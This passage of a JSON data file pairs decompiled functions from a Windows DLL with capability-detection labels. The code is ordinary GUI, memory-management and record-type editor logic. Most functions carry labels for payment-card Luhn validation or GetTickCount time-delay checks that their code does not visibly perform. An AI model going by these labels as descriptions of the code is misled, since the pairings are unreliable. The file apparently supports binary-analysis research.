caret(^) at the start if it has not been explicitly included.\\r\\n\\r\\nClick the (i) icon to view the online ADFT documentation.\"\n                         );\n    (**0x1800de7f0)(uVar2, 0x403, 2, 30000);\n    uVar2 = (**0x1800de798)(*0x180125618, 0x23b6);\n    iVar3 = (**0x1800de638)(*0x18012a388, 0x2336);\n    if (iVar3 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3);\n        (**0x1800de0a8)(iVar3);\n    }\n    uStack136 = uStack136 & 0xffffffffffffff00;\n    fcn.180067d90(*0x180125618, 0x23b6, 0, L\"Move down the selected Record Type\");\n    uVar2 = (**0x1800de798)(*0x180125618, 0x23b7);\n    iVar3 = (**0x1800de638)(*0x18012a388, 0x2337);\n    if (iVar3 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3);\n        (**0x1800de0a8)(iVar3);\n    }\n    uStack136 = uStack136 & 0xffffffffffffff00;\n    fcn.180067d90(*0x180125618, 0x23b7, 0, L\"Move up the selected Record Type\");\n    uVar2 = (**0x1800de798)(*0x180125618, 0x23c1);\n    iVar3 = (**0x1800de638)(*0x18012a388, 0x2335);\n    if (iVar3 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3);\n        (**0x1800de0a8)(iVar3);\n    }\n    uStack136 = CONCAT71(uStack136._1_7_, 1);\n    uVar2 = fcn.180067d90(*0x180125618, 0x23c1, L\"Record-type Theme\", \n                          L\"Specify a different color theme than the file-type theme for select-few record types to make them distinctive.\\r\\n\\r\\nFor an example, see: \\'Transaction Headers\\' inside the Samples \u00c2\u00bb Treasury IPAC file.\\r\\n\\r\\nClick the (i) icon to view the online documentation.\"\n                         );\n    (**0x1800de7f0)(uVar2, 0x403, 2, 30000);\n    uVar2 = (**0x1800de798)(*0x180125618, 0x23ed);\n    iVar3 = (**0x1800de638)(*0x18012a388, 0x2335);\n    if (iVar3 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3);\n        (**0x1800de0a8)(iVar3);\n    }\n    uStack136 = uStack136 & 0xffffffffffffff00;\n    fcn.180067d90(*0x180125618, 0x23ed, 0, 0x1800f5528);\n    uVar2 = (**0x1800de798)(*0x180125618, 0x2396);\n    auStack120 = ZEXT816(0);\n    uStack40 = 0;\n    auStack104 = ZEXT816(0);\n    uStack32 = 0;\n    auStack88 = ZEXT816(0);\n    auStack72 = ZEXT816(0);\n    auStack56 = ZEXT816(0);\n    uVar4 = (**0x1800de7f0)(uVar2, 0x31, 0, 0);\n    iVar5 = (**0x1800de090)(uVar4, 0x5c, auStack120);\n    if (iVar5 != 0) {\n        uVar4 = (**0x1800de0b8)(auStack120);\n        (**0x1800de7f0)(uVar2, 0x30, uVar4);\n    }\n    fcn.180066d20(0x180125600);\n    (**0x1800de7f0)(*0x180125610, 0x806, 0, *0x180125618);\n    fcn.180022ab0(0x180125600);\n    fcn.180024b70(0x180125600);\n    fcn.18008fb00(uStack24 ^ auStack168);\n    return;\n}\n",
        "token_count": 3031
    },
    "180024b7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180024b70(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t ****ppppiVar3;\n    int64_t arg2;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong ****ppppuVar6;\n    int64_t **arg2_00;\n    ulong var_60h;\n    uchar auStack408 [40];\n    ulong uStack368;\n    int64_t ****ppppiStack360;\n    uint uStack352;\n    uint uStack348;\n    int64_t *piStack344;\n    uint64_t uStack336;\n    uchar auStack328 [16];\n    int64_t iStack312;\n    ulong ****appppuStack296 [3];\n    uint64_t uStack272;\n    ulong var_78h;\n    uint64_t uStack56;\n    \n    uStack368 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack408;\n    (**0x1800de7f0)(*(arg1 + 0x70), 0x184, 0, 0);\n    iVar4 = *(arg1 + 0xe0);\n    arg2 = *(arg1 + 0xd8);\n    if (arg2 != iVar4) {\n        do {\n            fcn.180024ec0(appppuStack296, arg2);\n            ppppuVar6 = appppuStack296;\n            if (7 < uStack272) {\n                ppppuVar6 = appppuStack296[0];\n            }\n            (**0x1800de7f0)(*(arg1 + 0x70), 0x180, 0, ppppuVar6);\n            fcn.180025000(appppuStack296);\n            arg2 = arg2 + 0xf0;\n        } while (arg2 != iVar4);\n        iVar4 = *(arg1 + 0xe0);\n    }\n    iVar4 = iVar4 - *(arg1 + 0xd8);\n    iVar4 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar4) >> 0x40, 0) + iVar4;\n    if (iVar4 >> 7 != iVar4 >> 0x3f) {\n        (**0x1800de7f0)(*(arg1 + 0x70), 0x186, 0, 0);\n    }\n    (**0x1800de7f0)(*(arg1 + 0x80), 0x14b, 0, 0);\n    (**0x1800de7f0)(*(arg1 + 0xd0), 0x14b, 0, 0);\n    (**0x1800de7f0)(*(arg1 + 0xd0), 0x143, 0, 0x1800f6108);\n    auStack328 = ZEXT816(0);\n    iStack312 = 0;\n    piStack344 = NULL;\n    uStack336 = 7;\n    ppppiStack360 = ppppiStack360 & 0xffffffffffff0000;\n    ppppiVar3 = &ppppiStack360;\n    fcn.180010d70(ppppiVar3, 0x1800f4cbc, 0);\n    fcn.180009c00(ppppiVar3, auStack328, &ppppiStack360);\n    for (; auStack328._0_8_ != auStack328._8_8_; auStack328._0_8_ = auStack328._0_8_ + 4) {\n        piStack344 = NULL;\n        uStack336 = 0;\n        piVar1 = auStack328._0_8_[2];\n        arg2_00 = auStack328._0_8_;\n        if (0x7 < auStack328._0_8_[3]) {\n            arg2_00 = *auStack328._0_8_;\n        }\n        if (piVar1 < 0x8) {\n            ppppiStack360 = *arg2_00;\n            uStack352 = *(arg2_00 + 1);\n            uStack348 = *(arg2_00 + 0xc);\n            uStack336 = 7;\n            ppppiVar3 = &ppppiStack360;\n        }\n        else {\n            uVar5 = piVar1 | 7;\n            if (0x7ffffffffffffffe < uVar5) {\n                uVar5 = 0x7ffffffffffffffe;\n            }\n            ppppiStack360 = fcn.180011cf0(&ppppiStack360, uVar5 + 1);\n            fcn.1800ade80(ppppiStack360, arg2_00, piVar1 * 2 + 2);\n            ppppiVar3 = &ppppiStack360;\n            uStack336 = uVar5;\n            if (7 < uVar5) {\n                ppppiVar3 = ppppiStack360;\n            }\n        }\n        piStack344 = piVar1;\n        (**0x1800de7f0)(*(arg1 + 0x80), 0x143, 0, ppppiVar3);\n        ppppiVar3 = &ppppiStack360;\n        if (7 < uStack336) {\n            ppppiVar3 = ppppiStack360;\n        }\n        (**0x1800de7f0)(*(arg1 + 0xd0), 0x143, 0, ppppiVar3);\n        if (7 < uStack336) {\n            ppppiVar3 = ppppiStack360;\n            if ((0xfff < uStack336 * 2 + 2) && (ppppiVar3 = ppppiStack360[-1],  0x1f < ppppiStack360 + (-8 - ppppiVar3))\n               ) goto code_r0x000180024eb4;\n            fcn.18008fb24(ppppiVar3);\n        }\n    }\n    *(arg1 + 0x61) = 0x101;\n    fcn.1800277d0(arg1);\n    if (auStack328._0_8_ != NULL) {\n        fcn.180013aa0(auStack328._0_8_, auStack328._8_8_);\n        uVar5 = iStack312 - auStack328._0_8_ & 0xffffffffffffffe0;\n        iVar4 = auStack328._0_8_;\n        if (0xfff < uVar5) {\n            iVar4 = *(auStack328._0_8_ + -8);\n            if (0x1f < (auStack328._0_8_ - iVar4) - 8U) {\n                fcn.1800b3528(iVar4, uVar5 + 0x27);\ncode_r0x000180024eb4:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar4);\n    }\n    fcn.18008fb00(uStack56 ^ auStack408);\n    return;\n}\n",
        "token_count": 1602
    },
    "18002524": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * fcn.180025240(ushort *arg1)\n\n{\n    *(arg1 + 8) = 0;\n    *(arg1 + 0xc) = 7;\n    *arg1 = 0;\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x1c) = 7;\n    arg1[0x10] = 0;\n    *(arg1 + 0x28) = 0;\n    *(arg1 + 0x2c) = 7;\n    arg1[0x20] = 0;\n    *(arg1 + 0x30) = 0;\n    *(arg1 + 0x34) = 0;\n    *(arg1 + 0x38) = 0;\n    *(arg1 + 0x3c) = 0;\n    *(arg1 + 0x40) = 0;\n    *(arg1 + 0x44) = 0;\n    fcn.180090060(arg1 + 0x48, 0x20, 3, 0x18000da70);\n    return arg1;\n}\n",
        "token_count": 253
    },
    "1800252e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1800252e0(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    if (7 < arg1[0x13]) {\n        iVar2 = arg1[0x10];\n        iVar4 = arg1[0x13] * 2;\n        iVar3 = iVar2;\n        if (0xfff < iVar4 + 2U) {\n            iVar3 = *(iVar2 + -8);\n            iVar4 = iVar4 + 0x29;\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x00018002548f;\n        }\n        fcn.18008fb24(iVar3);\n    }\n    arg1[0x13] = 7;\n    arg1[0x12] = 0;\n    *(arg1 + 0x10) = 0;\n    if (7 < arg1[0xf]) {\n        iVar2 = arg1[0xc];\n        iVar4 = arg1[0xf] * 2;\n        iVar3 = iVar2;\n        if (0xfff < iVar4 + 2U) {\n            iVar3 = *(iVar2 + -8);\n            iVar4 = iVar4 + 0x29;\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x00018002548f;\n        }\n        fcn.18008fb24(iVar3);\n    }\n    arg1[0xe] = 0;\n    arg1[0xf] = 7;\n    *(arg1 + 0xc) = 0;\n    if (7 < arg1[0xb]) {\n        iVar2 = arg1[8];\n        iVar4 = arg1[0xb] * 2;\n        iVar3 = iVar2;\n        if (0xfff < iVar4 + 2U) {\n            iVar3 = *(iVar2 + -8);\n            iVar4 = iVar4 + 0x29;\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x00018002548f;\n        }\n        fcn.18008fb24(iVar3);\n    }\n    arg1[10] = 0;\n    arg1[0xb] = 7;\n    *(arg1 + 8) = 0;\n    if (7 < arg1[7]) {\n        iVar2 = arg1[4];\n        iVar4 = arg1[7] * 2;\n        iVar3 = iVar2;\n        if (0xfff < iVar4 + 2U) {\n            iVar3 = *(iVar2 + -8);\n            iVar4 = iVar4 + 0x29;\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x00018002548f;\n        }\n        fcn.18008fb24(iVar3);\n    }\n    arg1[6] = 0;\n    arg1[7] = 7;\n    *(arg1 + 4) = 0;\n    if (7 < arg1[3]) {\n        iVar2 = *arg1;\n        iVar4 = arg1[3] * 2;\n        iVar3 = iVar2;\n        if (0xfff < iVar4 + 2U) {\n            iVar3 = *(iVar2 + -8);\n            iVar4 = iVar4 + 0x29;\n            iVar2 = iVar2 - iVar3;\n            if (0x1f < iVar2 - 8U) {\ncode_r0x00018002548f:\n                fcn.1800b3528(iVar2, iVar4);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    arg1[2] = 0;\n    arg1[3] = 7;\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 909
    },
    "18002559": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.180025590(uint *arg1, uint *arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    *(arg1 + 4) = 0;\n    *(arg1 + 6) = 0;\n    uVar1 = arg2[1];\n    uVar2 = arg2[2];\n    uVar3 = arg2[3];\n    *arg1 = *arg2;\n    arg1[1] = uVar1;\n    arg1[2] = uVar2;\n    arg1[3] = uVar3;\n    uVar1 = arg2[5];\n    uVar2 = arg2[6];\n    uVar3 = arg2[7];\n    arg1[4] = arg2[4];\n    arg1[5] = uVar1;\n    arg1[6] = uVar2;\n    arg1[7] = uVar3;\n    *(arg2 + 4) = 0;\n    *(arg2 + 6) = 7;\n    *arg2 = 0;\n    *(arg1 + 0xc) = 0;\n    *(arg1 + 0xe) = 0;\n    uVar1 = arg2[9];\n    uVar2 = arg2[10];\n    uVar3 = arg2[0xb];\n    arg1[8] = arg2[8];\n    arg1[9] = uVar1;\n    arg1[10] = uVar2;\n    arg1[0xb] = uVar3;\n    uVar1 = arg2[0xd];\n    uVar2 = arg2[0xe];\n    uVar3 = arg2[0xf];\n    arg1[0xc] = arg2[0xc];\n    arg1[0xd] = uVar1;\n    arg1[0xe] = uVar2;\n    arg1[0xf] = uVar3;\n    *(arg2 + 0xc) = 0;\n    *(arg2 + 0xe) = 7;\n    *(arg2 + 8) = 0;\n    *(arg1 + 0x14) = 0;\n    *(arg1 + 0x16) = 0;\n    uVar1 = arg2[0x11];\n    uVar2 = arg2[0x12];\n    uVar3 = arg2[0x13];\n    arg1[0x10] = arg2[0x10];\n    arg1[0x11] = uVar1;\n    arg1[0x12] = uVar2;\n    arg1[0x13] = uVar3;\n    uVar1 = arg2[0x15];\n    uVar2 = arg2[0x16];\n    uVar3 = arg2[0x17];\n    arg1[0x14] = arg2[0x14];\n    arg1[0x15] = uVar1;\n    arg1[0x16] = uVar2;\n    arg1[0x17] = uVar3;\n    *(arg2 + 0x14) = 0;\n    *(arg2 + 0x16) = 7;\n    *(arg2 + 0x10) = 0;\n    *(arg1 + 0x18) = *(arg2 + 0x18);\n    *(arg1 + 0x1a) = 0;\n    *(arg1 + 0x1c) = 0;\n    *(arg1 + 0x1e) = 0;\n    *(arg1 + 0x1a) = *(arg2 + 0x1a);\n    *(arg1 + 0x1c) = *(arg2 + 0x1c);\n    *(arg1 + 0x1e) = *(arg2 + 0x1e);\n    *(arg2 + 0x1a) = 0;\n    *(arg2 + 0x1c) = 0;\n    *(arg2 + 0x1e) = 0;\n    *(arg1 + 0x20) = *(arg2 + 0x20);\n    arg1[0x22] = arg2[0x22];\n    fcn.18008ff1c(arg1 + 0x24, arg2 + 0x24, 0x20, 3);\n    return arg1;\n}\n",
        "token_count": 969
    },
    "180028f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180028f50(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    uVar3 = (**0x1800de7f0)(arg2, 0xbb, 0xffffffffffffffff);\n    iVar1 = (**0x1800de7f0)(arg2, 0xc9, uVar3, 0);\n    iVar2 = (**0x1800de7f0)(arg3, 0xba, 0, 0);\n    if (iVar1 < iVar2) {\n        iVar1 = (**0x1800de7f0)(arg3, 0xbb, iVar1, 0);\n        iVar2 = (**0x1800de7f0)(arg3, 0xc1, iVar1, 0);\n        iVar4 = 0x6c;\n        if (arg2 != *(arg1 + 0x30)) {\n            iVar4 = 0x68;\n        }\n        *(iVar4 + arg1) = iVar1;\n        (**0x1800de7f0)(arg3, 0xb1, iVar1, iVar2 + iVar1);\n        (**0x1800de7f0)(arg3, 0xb7, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 310
    },
    "18002904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180029040(ulong noname_0, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = (**0x1800de7f0)(arg2, 0xce, 0, 0);\n    iVar2 = (**0x1800de7f0)(arg3, 0xba, 0, 0);\n    if (iVar1 < iVar2) {\n        iVar2 = (**0x1800de7f0)(arg3, 0xce, 0, 0);\n        (**0x1800de7f0)(arg3, 0xb6, 0, iVar1 - iVar2);\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "18002c1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18002c1f0(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    char16_t *pcVar2;\n    uchar auStack264 [32];\n    uchar auStack232 [208];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack264;\n    iVar1 = *(arg1 + 0xe0) - *(arg1 + 0xd8);\n    iVar1 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar1) >> 0x40, 0) + iVar1;\n    if (0x3e6 < (iVar1 >> 7) - (iVar1 >> 0x3f)) {\n        fcn.180020a90(auStack232, 100, L\"Only %i File Types can be defined.\", 999);\n        pcVar2 = L\"Add New File Type\";\n        if (arg2 != '\\0') {\n            pcVar2 = L\"Clone Selected File Type\";\n        }\n        (**0x1800de710)(*(arg1 + 0x18), auStack232, pcVar2, 0x10);\n    }\n    fcn.18008fb00(uStack24 ^ auStack264);\n    return;\n}\n",
        "token_count": 289
    },
    "18002da7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18002da70(int64_t *arg1)\n\n{\n    return (arg1[1] - *arg1) / 0xa0;\n}\n",
        "token_count": 39
    },
    "18002df4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002df40(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    if (arg2 != arg3) {\n        do {\n            fcn.180025000(arg2);\n            arg2 = arg2 + 0xf0;\n        } while (arg2 != arg3);\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "18002e05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002e050(ulong noname_0, int64_t arg2, int64_t arg3)\n\n{\n    if (arg2 != arg3) {\n        do {\n            fcn.1800252e0(arg2);\n            arg2 = arg2 + 0xa0;\n        } while (arg2 != arg3);\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "18002e19": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.18002e190(ulong noname_0, int64_t arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint *puVar5;\n    ulong arg1;\n    int64_t in_R8;\n    \n    iVar3 = arg2;\n    if (0xfff < in_R8 * 0xf0) {\n        iVar3 = *(arg2 + -8);\n        if (0x1f < (arg2 - iVar3) - 8U) {\n            fcn.1800b3528(iVar3, in_R8 * 0xf0 + 0x27);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n    }\n    uVar4 = 0;\n    if ((iVar3 != 0) && (arg1 = *0x180129fa0,  uVar4 = (**0x1800de208)(*0x180129fa0, 0, iVar3),  uVar4 == 0)) {\n        puVar5 = fcn.1800ba53c(arg1);\n        uVar2 = (**0x1800de400)();\n        uVar4 = fcn.1800ba484(uVar2);\n        *puVar5 = uVar4;\n    }\n    return uVar4;\n}\n",
        "token_count": 313
    },
    "18002ea1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18002ea10(ulong *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    ulong *puVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uchar auStack344 [32];\n    int64_t iStack312;\n    uint uStack304;\n    uint uStack296;\n    uint uStack288;\n    ulong uStack280;\n    uchar auStack264 [64];\n    uchar auStack200 [64];\n    int64_t iStack136;\n    ulong uStack128;\n    int64_t iStack120;\n    uint64_t uStack24;\n    \n    uStack280 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack344;\n    iVar4 = arg1[2];\n    puVar3 = arg1;\n    if (7 < arg1[3]) {\n        puVar3 = *arg1;\n    }\n    if (7 < arg1[3]) {\n        arg1 = *arg1;\n    }\n    iVar1 = *arg2;\n    if (iVar1 != 0) {\n        fcn.1800ae290(auStack264, 0, 0xe8);\n        uStack296 = *(iVar1 + 0x20);\n        uStack304 = *(iVar1 + 0x28);\n        uStack288 = 0x10;\n        iStack312 = iVar1;\n        fcn.1800162e0(auStack264, arg1, puVar3 + iVar4 * 2, arg2 + 1);\n        fcn.1800171c0(auStack264, 0);\n        if (iStack136 != 0) {\n            uVar5 = iStack120 - iStack136 & 0xfffffffffffffff0;\n            iVar4 = iStack136;\n            if (0xfff < uVar5) {\n                iVar4 = *(iStack136 + -8);\n                if (0x1f < (iStack136 - iVar4) - 8U) {\n                    fcn.1800b3528(iVar4, uVar5 + 0x27);\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar4);\n            iStack136 = 0;\n            uStack128 = 0;\n            iStack120 = 0;\n        }\n        fcn.1800161d0(auStack200);\n        fcn.1800161d0(auStack264);\n    }\n    fcn.18008fb00(uStack24 ^ auStack344);\n    return;\n}\n",
        "token_count": 584
    },
    "18002f0b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18002f0b0(int64_t *arg1, ulong arg2, uint64_t arg3)\n\n{\n    code *pcVar1;\n    uchar (*arg2_00) [16];\n    uchar *arg1_00;\n    uint64_t uVar2;\n    uchar auStack232 [32];\n    uchar (*pauStack200) [16];\n    ulong uStack192;\n    uchar (*pauStack184) [16];\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uchar auStack72 [16];\n    uchar auStack56 [16];\n    ulong uStack40;\n    uint64_t uStack16;\n    \n    uStack192 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack232;\n    auStack104 = ZEXT816(0);\n    auStack88 = ZEXT816(0);\n    auStack72 = ZEXT816(0);\n    auStack56 = ZEXT816(0);\n    uStack40 = 0;\n    auStack168 = CONCAT88(arg2, arg2);\n    auStack152 = ZEXT816(arg3);\n    auStack136 = ZEXT816(0);\n    auStack120 = ZEXT816(0);\n    pauStack200 = fcn.18008fb2c(0x30);\n    *pauStack200 = ZEXT816(0);\n    pauStack200[1] = ZEXT816(0);\n    pauStack200[2] = ZEXT816(0);\n    *(*pauStack200 + 8) = 0x14;\n    *pauStack200[1] = 0;\n    *(pauStack200[1] + 8) = 0;\n    **pauStack200 = vtable.std::_Root_node.0;\n    *(pauStack200[2] + 4) = 0;\n    *(pauStack200[2] + 0xc) = 0;\n    auStack88 = CONCAT124(auStack88._4_12_, 1);\n    auStack88 = CONCAT88(arg1 + 1, auStack88._0_8_);\n    auStack72 = CONCAT88(arg1 + 1, 0x400000100);\n    auStack56 = CONCAT124(auStack56._4_12_, 1);\n    uStack40 = CONCAT44(uStack40._4_4_, 0x8775dfb);\n    auStack104._0_8_ = pauStack200;\n    auStack104._8_8_ = pauStack200;\n    fcn.180030080(auStack168);\n    pauStack200 = auStack104;\n    arg2_00 = fcn.18008fb2c(0x28);\n    *arg2_00 = ZEXT816(0);\n    arg2_00[1] = ZEXT816(0);\n    *arg2_00[2] = 0;\n    *(*arg2_00 + 8) = 0xd;\n    *arg2_00[1] = 0;\n    *(arg2_00[1] + 8) = 0;\n    **arg2_00 = vtable.std::_Node_capture.0;\n    *arg2_00[2] = 0;\n    *(arg2_00[1] + 8) = auStack104._8_8_;\n    if (*auStack104._8_8_[1] != 0) {\n        *arg2_00[1] = *auStack104._8_8_[1];\n        *(*auStack104._8_8_[1] + 0x18) = arg2_00;\n    }\n    *auStack104._8_8_[1] = arg2_00;\n    auStack104 = CONCAT88(arg2_00, auStack104._0_8_);\n    arg1_00 = auStack168;\n    pauStack184 = arg2_00;\n    fcn.180030320(arg1_00);\n    if (auStack168._0_8_ == auStack152._0_8_) {\n        fcn.180015670(auStack104, arg2_00);\n        fcn.180015eb0(auStack104, 0x15);\n        *(auStack104._0_8_ + 0x20) = auStack56._0_4_;\n        *(auStack104._0_8_ + 0x28) = auStack152._8_4_ + 1;\n        fcn.180003c40(auStack104._0_8_, 0, 0);\n        LOCK();\n        *(auStack104._0_8_ + 0x2c) = *(auStack104._0_8_ + 0x2c) + 1;\n        fcn.18002e090(arg1);\n        *arg1 = auStack104._0_8_;\n        if (auStack136._0_8_ != NULL) {\n            uVar2 = auStack120._0_8_ - auStack136._0_8_ & 0xfffffffffffffffc;\n            arg1_00 = auStack136._0_8_;\n            if (0xfff < uVar2) {\n                arg1_00 = *(auStack136._0_8_ + -8);\n                if (0x1f < auStack136._0_8_ + (-8 - arg1_00)) {\n                    fcn.1800b3528(arg1_00, uVar2 + 0x27);\n                    goto code_r0x00018002f2de;\n                }\n            }\n            fcn.18008fb24(arg1_00);\n        }\n        fcn.18008fb00(uStack16 ^ auStack232);\n        return;\n    }\ncode_r0x00018002f2de:\n    fcn.180015140(arg1_00, 0xe);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1346
    },
    "18002f5f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002f5f0(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t arg1_00;\n    \n    arg1_00 = *arg1;\n    if (arg1_00 != 0) {\n        iVar3 = arg1[1];\n        if (arg1_00 != iVar3) {\n            do {\n                fcn.180025000(arg1_00);\n                arg1_00 = arg1_00 + 0xf0;\n            } while (arg1_00 != iVar3);\n            arg1_00 = *arg1;\n        }\n        iVar2 = arg1[2] - arg1_00;\n        iVar3 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar2) >> 0x40, 0) + iVar2;\n        uVar4 = ((iVar3 >> 7) - (iVar3 >> 0x3f)) * 0xf0;\n        iVar3 = arg1_00;\n        if (0xfff < uVar4) {\n            iVar3 = *(arg1_00 + -8);\n            if (0x1f < (arg1_00 - iVar3) - 8U) {\n                fcn.1800b3528(iVar2, uVar4 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar3);\n    }\n    *arg1 = arg2;\n    arg1[1] = arg3 * 0xf0 + arg2;\n    arg1[2] = arg4 * 0xf0 + arg2;\n    return;\n}\n",
        "token_count": 421
    },
    "18002f6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18002f6d0(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    uchar auStack88 [32];\n    ulong uStack56;\n    uchar auStack48 [16];\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack88;\n    auStack48 = CONCAT88(arg2, arg2);\n    uStack32 = arg1;\n    if (arg3 != 0) {\n        do {\n            fcn.1800ae290(arg2, 0, 0xf0);\n            fcn.180025240(arg2);\n            arg2 = arg2 + 0xf0;\n            auStack48 = CONCAT88(arg2, auStack48._0_8_);\n            arg3 = arg3 + -1;\n        } while (arg3 != 0);\n    }\n    fcn.18008fb00(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 238
    },
    "18002f85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * fcn.18002f850(ulong noname_0, ushort *arg2, int64_t arg3)\n\n{\n    ulong *puVar1;\n    \n    if (arg3 != 0) {\n        puVar1 = arg2 + 0x1c;\n        do {\n            *(arg2 + 1) = ZEXT816(0);\n            *(arg2 + 9) = ZEXT816(0);\n            *(arg2 + 0x11) = ZEXT816(0);\n            *(arg2 + 0x19) = ZEXT816(0);\n            *(arg2 + 0x21) = ZEXT816(0);\n            *(arg2 + 0x29) = ZEXT816(0);\n            *(arg2 + 0x31) = ZEXT816(0);\n            *(arg2 + 0x39) = ZEXT816(0);\n            *(arg2 + 0x41) = ZEXT816(0);\n            *(arg2 + 0x49) = 0;\n            *(arg2 + 0x4d) = 0;\n            arg2[0x4f] = 0;\n            *arg2 = 0;\n            arg2 = arg2 + 0x50;\n            puVar1[-5] = 0;\n            puVar1[-4] = 7;\n            puVar1[-1] = 0;\n            *puVar1 = 7;\n            *(puVar1 + -3) = 0;\n            puVar1[3] 